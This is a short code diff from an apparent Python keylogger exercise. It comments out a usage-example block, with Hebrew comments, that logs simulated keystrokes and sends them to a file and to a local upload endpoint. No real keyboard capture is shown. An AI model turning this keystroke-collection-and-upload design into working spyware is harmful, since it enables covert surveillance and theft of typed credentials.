@@ -37,22 +37,22 @@ class KeyLoggerService:
 
 
 
-############################
-
-# דוגמאות שימוש!
-
-service = KeyLoggerService()
-#לקובץ
-writerFile = FileWriter()
-#לשרת
-writerNet = NetworkWriter("http://127.0.0.1:5000/api/upload")
-
-# "מדמה" הקשות
-service.log_key("Y")
-service.log_key("E")
-
-# אוספים ושולחים-לקובץ/שרת
-keys = service.get_logged_keys()
-
-writerFile.send_data("".join(keys), "computer1")
-writerNet.send_data("".join(keys), "computer2")
+# ############################
+#
+# # דוגמאות שימוש!
+#
+# service = KeyLoggerService()
+# #לקובץ
+# writerFile = FileWriter()
+# #לשרת
+# writerNet = NetworkWriter("http://127.0.0.1:5000/api/upload")
+#
+# # "מדמה" הקשות
+# service.log_key("Y")
+# service.log_key("E")
+#
+# # אוספים ושולחים-לקובץ/שרת
+# keys = service.get_logged_keys()
+#
+# writerFile.send_data("".join(keys), "computer1")
+# writerNet.send_data("".join(keys), "computer2")
